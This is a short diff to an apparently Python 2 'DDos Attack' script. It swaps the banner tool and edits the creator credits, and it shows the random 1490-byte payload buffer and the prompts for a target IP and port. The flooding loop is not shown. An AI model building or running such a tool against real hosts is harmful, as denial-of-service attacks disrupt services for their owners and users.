@@ -18,10 +18,10 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("toilet DDos Attack")
+os.system("figlet DDos Attack")
 print
-print "Creator   : Nazmul Tufan"
-print "You Tube [Support]: https://YouTube.com/TermuxBangla"
+print "Creator   : Nazmul Tufan[ANM Miah]"
+print "Hackers [Admin]: https://www.facebook.com/zihad.hossain36"
 print "github   : https://github.com/deebweb8578"
 print "Facebook : https://www.facebook.com/access.darkweb.hacker"
 print
@@ -29,7 +29,7 @@ ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
-os.system("toilet Attack Starting")
+os.system("figlet Attack Starting")
 print "[                    ] 0% "
 time.sleep(5)
 print "[=====               ] 25%"
